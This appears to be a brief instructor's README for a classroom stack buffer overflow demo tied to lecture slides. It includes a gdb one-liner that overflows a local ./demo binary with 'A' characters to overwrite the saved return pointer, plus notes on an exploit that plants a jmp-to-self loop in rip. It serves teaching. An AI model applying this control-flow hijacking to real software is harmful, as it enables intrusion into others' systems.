Basic buffer overflow example that will cause the ./demo binary to hang forever.

Intended for slide 151 but can also be referenced as quick demo for slide 29 

Step 1: run the ./demo for reference
Step 2: run ./exploit.py (will execute a subprocess.run of ./demo)
Step 3: investigate .py file if desired


gdb ./demo 
	r <<< $(python3 -c "print('A'*0x200)")
		Runs a command within the $(…), and pipes the output into the executable’s stdin
info frame - saved rip = 0x4141414141414141


./exploit - use gdb to attach to pid of demo 
info frame
0x6afafeeb - Can see it inserted ebfe into rip - jmp loop
